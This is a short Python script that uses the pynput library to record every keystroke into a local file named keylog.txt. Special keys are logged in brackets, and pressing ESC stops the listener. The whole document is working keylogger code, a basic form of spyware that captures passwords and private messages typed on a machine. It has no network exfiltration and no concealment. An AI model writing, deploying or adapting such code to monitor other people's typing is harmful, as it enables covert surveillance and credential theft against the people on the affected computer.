from pynput import keyboard

# Define the file to log keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Try to log the key as a character
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Handle special keys (e.g., space, enter)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f'[{key}]')

def on_release(key):
    # Stop listener with ESC key
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
